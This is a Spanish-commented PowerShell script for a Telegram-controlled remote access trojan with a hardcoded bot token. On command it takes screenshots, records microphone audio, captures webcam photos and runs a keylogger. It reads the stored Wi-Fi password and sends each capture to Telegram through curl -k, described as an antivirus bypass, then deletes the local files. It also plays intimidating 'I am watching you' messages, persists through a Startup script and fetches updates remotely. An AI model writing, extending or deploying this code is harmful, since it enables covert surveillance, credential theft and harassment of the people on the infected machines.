# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO
$Global:GrabandoTeclado = $false
# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME
# ==============================================================================
# NO BORRAR #############################################################
# ==============================================================================
# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM 
# ==============================================================================
# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# Habilitar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==============================================================================
# LIMPIAR HISTORIAL ANTES DE INICIAR
# ==============================================================================
$LastUpdateID = 0
try {
    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
    if ($PreCheck.result.Count -gt 0) {
        $LastUpdateID = $PreCheck.result[-1].update_id + 1
        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
    }
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = " Ver 22/07/26v2 PC En Linea y Protegida: " + $User + "@" + $MiPC
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
} catch {}

# ==============================================================================
# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
# ==============================================================================
while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
                foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                # 1. Separar el texto por espacios de forma estricta
                $Partes = $TextoRecibido -split " "
                
                # OBLIGATORIO: Extraer solo la primera palabra (El comando) usando [0]
                $Comando = [string]$Partes[0]
                $Comando = $Comando.ToLower()
                
                # OBLIGATORIO: Extraer la segunda palabra (El ID de la PC) usando [1]
                $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                # CÁLCULO UNIFICADO DE ID ÚNICO DE 3 DÍGITOS
                $Md5 = [System.Security.Cryptography.MD5]::Create()
                $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
                $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                $MiIDNum = [string]$IdUnico


                # --- COMANDO GLOBAL: /lista ---
                if ($Comando -eq "/lista") {
                    $RespuestaLista = "ver 22/07/26v2 EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL REMOTO ACTUALIZADO`n`n" +
                                  "Comandos Globales:`n" +
                                  "  - /lista - Ver que numero de ID tomo cada PC activa.`n" +
                                  "  - /ayuda - Ver este menu de instrucciones.`n`n" +
                                  "Comandos de Sistema [Comando + ID]:`n" +
                                  "  - /pantalla_off [ID] - Bloquea la PC y suspende el monitor.`n" +
                                  "  - /pantalla_on [ID]  - Despierta la pantalla simulando Shift.`n" +
                                  "  - /notepad [ID]      - Abre el Bloc de notas con un mensaje.`n" +
                                  "  - /note [ID] [Texto] - Abre el Bloc de notas con tu frase personalizada.`n" +
                                  "  - /youtube [ID]      - Abre tu video de YouTube fijo de GitHub.`n" +
                                  "  - /hablar [ID]       - Clava volumen al 100% y dice tu frase fija.`n" +
                                  "  - /red [ID]          - Muestra la interfaz de red activa y la IP privada.`n" +
                                  "  - /actualizar [ID]   - Descarga el nuevo codigo sin cache y se reinicia.`n`n" +
                                  "Monitoreo y Multimedia [Comando + ID]:`n" +
                                  "  - /captura [ID]      - Toma una foto de la pantalla (C:\ScriptCliente).`n" +
                                  "  - /ecaptura [ID]     - Sube la foto a Telegram por Curl -k y la borra.`n" +
                                  "  - /audio [ID]        - Graba 10 segundos de microfono y te manda el WAV.`n" +
                                  "  - /foto_cam [ID]     - Enciende la webcam, toma foto frontal y la envia.`n" +
                                  "  - /key_on [ID]       - Inicia keylogger en paralelo en segundo plano.`n" +
                                  "  - /key_off [ID]      - Detiene el keylogger, te manda el TXT por Curl y lo borra."
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }
# VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                 
                 switch ($Comando) {
                 
                        "/pantalla_off" {
                            $rundll = New-Object -ComObject WScript.Shell
                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                            continue
                        }
                        
                        "/pantalla_on" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("{SHIFT}")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                            continue
                        }
                                             "/youtube" {
                            # CAMBIÁ ESTE ENLACE: Poné entre comillas la URL fija que vos quieras
                            $UrlFija = "https://youtube.com"

                            # Abre el navegador directo con tu video predefinido
                            Start-Process $UrlFija
                            
                            $Respuesta = "Abriendo el video predefinido de YouTube en ID $MiIDNum"
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                            continue
                        }                        
                       

                        "/hablar" {
                            # 1. Creamos el objeto de control del sistema de Windows
                            $wshShell = New-Object -ComObject WScript.Shell
                            
                            # 2. Sube el volumen al 100% (Manda la señal de 'Subir Volumen' 50 veces seguidas)
                            for ($i = 0; $i -lt 50; $i++) {
                                $wshShell.SendKeys([char]175)
                            }

                            # 3. CAMBIÁ ESTA FRASE: Poné entre comillas lo que querés que diga la PC
                            $FraseFija = "Alerta del sistema. Te estoy observando por internet."

                            # 4. Invoca el motor de voz de Windows y reproduce el texto fijo
                            $Voice = New-Object -ComObject SAPI.SpVoice
                            [void]$Voice.Speak($FraseFija)
                            
                            # 5. Notificación de éxito a Telegram
                            $Respuesta = "Volumen maximizado y frase reproducida en ID $MiIDNum"
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                            continue
                        }                                                "/actualizar" {
                            $Respuesta = "🔄 Forzando descarga limpia desde GitHub en ID $MiIDNum..."
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                            
                            # 1. Espera un segundo para que el mensaje de Telegram salga limpio
                            Start-Sleep -Seconds 1
                            
                            # 2. TRUCO DE CACHÉ: Descarga el archivo fresco en vivo rompiendo el búfer de Windows
                            $UrlGitHub = "https://githubusercontent.com"
                            $RutaLocal = "$PSScriptRoot\cliente_base.ps1"
                            
                            try {
                                # Le sumamos un número único basado en la hora actual al enlace (?v=123456)
                                # Esto hace que Windows piense que es una web nueva y no use el caché viejo
                                $UrlUnica = $UrlGitHub + "?v=" + (Get-Date -UFormat "%s")
                                
                                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                                Invoke-WebRequest -Uri $UrlUnica -OutFile $RutaLocal -TimeoutSec 10 -ErrorAction Stop
                            } catch {
                                # Si falla el internet o GitHub, mantiene tu copia local intacta y no rompe nada
                            }

                            # 3. Una vez descargado el nuevo código en el disco, ejecutamos tu flujo manual:
                            # Llama a tu 'iniciar_cliente.vbs' para que limpie procesos y levante el nuevo archivo
                            $RutaInicio = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\iniciar_cliente.vbs"
                            if (Test-Path $RutaInicio) {
                                Start-Process "wscript.exe" -ArgumentList "`"$RutaInicio`""
                            }
                            
                            # 4. Destruye la memoria del proceso viejo de inmediato
                            Stop-Process -Id $PID -Force
                            continue
                        }                                             
                                                                          "/captura" {
                            $RutaFotoFija = "C:\ScriptCliente\screenshot.png"
                            try {
                                # 1. Forzar la carga manual de las librerías gráficas de Windows
                                [void][Reflection.Assembly]::LoadWithPartialName("System.Drawing")
                                [void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
                                
                                # 2. Motor gráfico nativo puro: Captura toda la pantalla
                                $Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                                $Bitmap = New-Object Drawing.Bitmap $Bounds.Width, $Bounds.Height
                                $Graphics = [Drawing.Graphics]::FromImage($Bitmap)
                                $Graphics.CopyFromScreen($Bounds.Location, [Drawing.Point]::Empty, $Bounds.Size)
                                
                                # 3. Guarda la imagen de forma física en tu carpeta
                                $Bitmap.Save($RutaFotoFija, [System.Drawing.Imaging.ImageFormat]::Png)
                                
                                # Liberar la memoria RAM del sistema
                                $Graphics.Dispose()
                                $Bitmap.Dispose()

                                # 4. Mandar texto de confirmación a Telegram
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Foto creada con exito en el disco de ID $MiIDNum" })
                            } catch {
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Error de hardware grafico local en ID $MiIDNum" })
                            }
                            continue
                        }

                                                                    "/key_on" {
                            if ($Global:GrabandoTeclado) {
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "El registro ya se encuentra activo en ID $MiIDNum" })
                                continue
                            }

                            $Global:GrabandoTeclado = $true
                            $RutaTxt = "C:\ScriptCliente\registro_teclas.txt"
                            if (Test-Path $RutaTxt) { Remove-Item $RutaTxt -Force }

                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Registro de teclas optimizado iniciado en ID $MiIDNum..." })

                            Start-Job -Name "EscuchaTeclado" -ScriptBlock {
                                $MethodDefinition = '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);'
                                $User32 = Add-Type -MemberDefinition $MethodDefinition -Name "User32Keys" -Namespace "Win32" -PassThru
                                
                                $RutaArchivo = "C:\ScriptCliente\registro_teclas.txt"
                                
                                # Creamos una lista en la memoria RAM para saber que teclas ya estaban apretadas
                                $TeclasApretadas = @{}
                                for ($i = 8; $i -le 254; $i++) { $TeclasApretadas[$i] = $false }

                                while ($true) {
                                    Start-Sleep -Milliseconds 5
                                    
                                    for ($k = 8; $k -le 254; $k++) {
                                        $Estado = $User32::GetAsyncKeyState($k)
                                        $EstaPresionada = (($Estado -band 0x8000) -eq 0x8000)

                                        # FILTRO DE REBOTE: Solo registra si la tecla cambia de suelta a presionada
                                        if ($EstaPresionada -and -not $TeclasApretadas[$k]) {
                                            $TeclasApretadas[$k] = $true # Guardamos que el dedo sigue apoyado
                                            
                                            $Letra = [char]$k
                                            if ($k -eq 13) { $Letra = "`r`n[ENTER]`r`n" }
                                            elseif ($k -eq 32) { $Letra = " " }
                                            elseif ($k -eq 8)  { $Letra = "[BACKSPACE]" }
                                            elseif ($k -eq 9)  { $Letra = "[TAB]" }
                                            
                                            if ($k -ge 32 -and $k -le 126 -or $k -eq 13 -or $k -eq 8) {
                                                [System.IO.File]::AppendAllText($RutaArchivo, $Letra)
                                            }
                                        }
                                        # Si el usuario levanto el dedo, liberamos la tecla para la proxima pulsacion
                                        elseif (-not $EstaPresionada) {
                                            $TeclasApretadas[$k] = $false
                                        }
                                    }
                                }
                            } | Out-Null

                            continue
                        }


                        "/key_off" {
                            if (-not $Global:GrabandoTeclado) {
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "El registro no estaba activo en ID $MiIDNum" })
                                continue
                            }

                            # 1. Frenamos el proceso en paralelo que capturaba las teclas
                            $Global:GrabandoTeclado = $false
                            Stop-Job -Name "EscuchaTeclado" -ErrorAction SilentlyContinue
                            Remove-Job -Name "EscuchaTeclado" -ErrorAction SilentlyContinue

                            $RutaTxt = "C:\ScriptCliente\registro_teclas.txt"
                            Start-Sleep -Seconds 1

                            # 2. TRANSMISIÓN GANADORA: Si el archivo con el texto existe, te lo manda por sendDocument
                            if (Test-Path $RutaTxt) {
                                $UrlFinalSend = $URL + "/sendDocument"
                                
                                # Usamos curl con -k para romper el cerrojo del antivirus como aprendimos antes
                                & "curl.exe" -k -F "chat_id=$ChatID" -F "document=@$RutaTxt" -F "caption=Reporte de teclas capturadas en ID $MiIDNum" $UrlFinalSend
                                
                                # Esperamos a que la red entregue el archivo y limpiamos el disco duro
                                Start-Sleep -Seconds 1
                                Remove-Item $RutaTxt -Force
                            } else {
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "No se registro ninguna pulsacion en ID $MiIDNum" })
                            }
                            continue
                        }
 










"/ecaptura" {
                            $RutaFotoFija = "C:\ScriptCliente\screenshot.png"
                            try {
                                # 1. Verificamos si la imagen creada existe en la carpeta
                                if (Test-Path $RutaFotoFija) {
                                    
                                    # 2. Dirección de red oficial y exacta para subir fotos
                                    $UrlFinalSend = $URL + "/sendPhoto"
                                    
                                    # 3. TRANSMISIÓN INYECTADA GANADORA: Usa curl nativo con el bypass -k contra el antivirus
                                    & "curl.exe" -k -F "chat_id=$ChatID" -F "photo=@$RutaFotoFija" -F "caption=Captura exitosa de ID $MiIDNum" $UrlFinalSend
                                    
                                    # Le damos un segundo de tolerancia para asegurar la transmision completa
                                    Start-Sleep -Seconds 1
                                    
                                    # 4. Limpiamos la carpeta borrando la foto enviada para mantener el disco ordenado
                                    Remove-Item $RutaFotoFija -Force
                                } else {
                                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "No se encontro ninguna imagen para enviar en ID $MiIDNum. Usa /captura primero." })
                                }
                            } catch {
                                $ErrorMensaje = $_.Exception.Message
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Fallo de envio: $ErrorMensaje en ID $MiIDNum" })
                            }
                            continue
                        }
                        "/audio" {
                            $RutaAudio = "C:\ScriptCliente\grabacion.wav"
                            try {
                                # 1. Cargamos la API multimedia nativa de Windows (winmm.dll)
                                $MethodDefinition = '[DllImport("winmm.dll", EntryPoint="mciSendStringA")] public static extern int mciSendString(string lpstrCommand, System.Text.StringBuilder lpstrReturnString, int uReturnLength, int hwndCallback);'
                                $WinMM = Add-Type -MemberDefinition $MethodDefinition -Name "WinMMUtils" -Namespace "Win32" -PassThru -ErrorAction SilentlyContinue

                                # 2. Inicializamos el hardware de grabacion en calidad estándar
                                [void]$WinMM::mciSendString("open new type waveaudio alias grabador", $null, 0, 0)
                                [void]$WinMM::mciSendString("set grabador bitspersample 16 samplespersec 44100 channels 2 bytespersec 176400 alignment 4", $null, 0, 0)

                                # 3. Avisamos a Telegram que empieza la grabacion
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "🎤 Grabando 10 segundos de audio en ID $MiIDNum..." })

                                # 4. Arranca la grabacion fisica y esperamos exactamente 10 segundos en silencio
                                [void]$WinMM::mciSendString("record grabador", $null, 0, 0)
                                Start-Sleep -Seconds 10

                                # 5. Detenemos el hardware y guardamos el archivo .wav en el disco
                                [void]$WinMM::mciSendString("stop grabador", $null, 0, 0)
                                [void]$WinMM::mciSendString("save grabador `"$RutaAudio`"", $null, 0, 0)
                                [void]$WinMM::mciSendString("close grabador", $null, 0, 0)

                                # 6. TRANSMISIÓN GANADORA: Usamos el curl inyectado con el bypass '-k' para saltar el antivirus
                                if (Test-Path $RutaAudio) {
                                    $UrlFinalSend = $URL + "/sendAudio"
                                    & "curl.exe" -k -F "chat_id=$ChatID" -F "audio=@$RutaAudio" -F "title=Audio en vivo" -F "caption=Grabacion de 10 segundos de ID $MiIDNum" $UrlFinalSend
                                    
                                    # Le damos un segundo de tolerancia y limpiamos el disco
                                    Start-Sleep -Seconds 1
                                    Remove-Item $RutaAudio -Force
                                } else {
                                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "No se pudo generar el archivo de audio en ID $MiIDNum" })
                                }
                            } catch {
                                $ErrorMensaje = $_.Exception.Message
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Fallo comando de audio: $ErrorMensaje en ID $MiIDNum" })
                            }
                            continue
                        }

                                               "/foto_cam" {
                            $RutaCam = "C:\ScriptCliente\webcam.jpg"
                            try {
                                # 1. Avisamos a Telegram con texto plano ultra seguro
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Encendiendo webcam y tomando foto en ID $MiIDNum..." })

                                # 2. Cargamos librerias de Windows
                                [void][Reflection.Assembly]::LoadWithPartialName("System.Drawing")
                                [void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
                                
                                # TRUCO MAESTRO: Codigo de camara en una linea continua para evitar fallas de renglon en GitHub
                                $CodigoCamara = "using System; using System.Runtime.InteropServices; using System.Drawing; using System.Drawing.Imaging; using System.Windows.Forms; public class WebcamCapture { [DllImport(`"avicap32.dll`")] public static extern int capCreateCaptureWindowA(string n, int s, int x, int y, int w, int h, int p, int i); [DllImport(`"user32.dll`")] public static extern int SendMessage(int h, int m, int w, int l); public static void Capturar(string r) { int h = capCreateCaptureWindowA(`"WebCam`", 0, 0, 0, 640, 480, 0, 0); if (SendMessage(h, 0x40a, 0, 0) != 0) { SendMessage(h, 0x43c, 0, 0); SendMessage(h, 0x41e, 0, 0); SendMessage(h, 0x40b, 0, 0); if (Clipboard.ContainsImage()) { Image img = Clipboard.GetImage(); img.Save(r, ImageFormat.Jpeg); img.Dispose(); } } } }"
                                
                                # Compilamos en memoria RAM de forma invisible
                                Add-Type -TypeDefinition $CodigoCamara -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction SilentlyContinue

                                # 3. Ejecutamos la captura fisica
                                [WebcamCapture]::Capturar($RutaCam)
                                Start-Sleep -Seconds 1

                                # 4. TRANSMISION GANADORA: Subida directa por Curl saltando el antivirus con el modificador -k
                                if (Test-Path $RutaCam) {
                                    $UrlFinalSend = $URL + "/sendPhoto"
                                    & "curl.exe" -k -F "chat_id=$ChatID" -F "photo=@$RutaCam" -F "caption=Foto de la webcam de ID $MiIDNum" $UrlFinalSend
                                    
                                    Start-Sleep -Seconds 1
                                    Remove-Item $RutaCam -Force
                                } else {
                                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "La webcam esta apagada, tapada o en uso por otra app en ID $MiIDNum" })
                                }
                            } catch {
                                $ErrorMensaje = $_.Exception.Message
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Fallo comando de camara: $ErrorMensaje en ID $MiIDNum" })
                            }
                            continue
                        }








                        "/notepad" {
                            Start-Process "notepad.exe"
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                            continue # 👈 CORREGIDO: Esto evita que se choque con el comando /red
                        }
                        
                                                                         "/red" {
                            # 1. Detectar la placa de red real con conexion activa
                            $RutaActiva = Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1
                            
                            $NombreInterfaz = "No detectada"
                            $IpPrivada = "No detectada"
                            $NombreWiFi = "No conectado (Es cable Ethernet)"
                            $ClaveWiFi = "No aplica"

                            if ($RutaActiva) {
                                $NombreInterfaz = $RutaActiva.InterfaceAlias
                                $IpPrivada = (Get-NetIPAddress -InterfaceIndex $RutaActiva.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
                                
                                # 2. Si esta usando Wi-Fi, extraer el nombre de la red y su contraseña
                                if ($NombreInterfaz -like "*Wi-Fi*" -or $NombreInterfaz -like "*Wireless*") {
                                    # Obtiene el nombre del perfil de red activo
                                    $Perfil = (netsh wlan show interfaces | Select-String -Pattern "^\s+SSID\s+:\s+(.+)$")
                                    if ($Perfil) {
                                        $NombreWiFi = $Perfil.Matches.Groups[1].Value.Trim()
                                        
                                        # Comando nativo para revelar la clave guardada de ese perfil específico
                                        $XmlInfo = (netsh wlan show profile name="$NombreWiFi" key=clear | Select-String -Pattern "Contenido de la clave\s+:\s+(.+)$")
                                        if ($XmlInfo) {
                                            $ClaveWiFi = $XmlInfo.Matches.Groups[1].Value.Trim()
                                        } else {
                                            $ClaveWiFi = "No encontrada o red abierta"
                                        }
                                    }
                                }
                            }

                            # 3. Obtener la IP Publica
                            $IpPublica = "Desconocida"
                            try {
                                $IpPublica = (Invoke-RestMethod -Uri "https://icanhazip.com" -TimeoutSec 5).Trim()
                            } catch {}

                            # 4. Armar el reporte de texto plano seguro
                            $ReporteRed = "REPORTE DE RED (ID: $MiIDNum)`nAdaptador: $NombreInterfaz`nNombre Wi-Fi: $NombreWiFi`nClave Wi-Fi: $ClaveWiFi`nIP Privada: $IpPrivada`nIP Publica: $IpPublica"
                                          
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
                            continue
                        }






                    } # Cierre limpio del switch
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 3
    }
    Start-Sleep -Seconds 2
}

